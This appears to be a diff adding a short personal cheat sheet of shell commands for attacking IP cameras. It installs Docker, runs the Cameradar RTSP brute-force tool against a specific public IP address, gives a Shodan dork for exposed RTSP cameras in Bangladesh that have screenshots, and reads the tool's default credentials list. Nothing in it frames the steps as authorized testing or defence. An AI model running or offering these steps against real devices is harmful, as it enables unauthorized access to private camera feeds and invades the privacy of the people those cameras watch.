@@ -1,0 +1,13 @@
+sudo apt update
+sudo apt install docker.io
+
+git clone github.com/ullaakut/cameradar 
+sudo docker run -t ullaakut/cameradar -t 163.53.181.178
+
+Shodan Dork : RTSP/1.0 has_screenshot:true country:BD
+
+cd internal/dict/assets/
+cat credentials.json
+
+
+
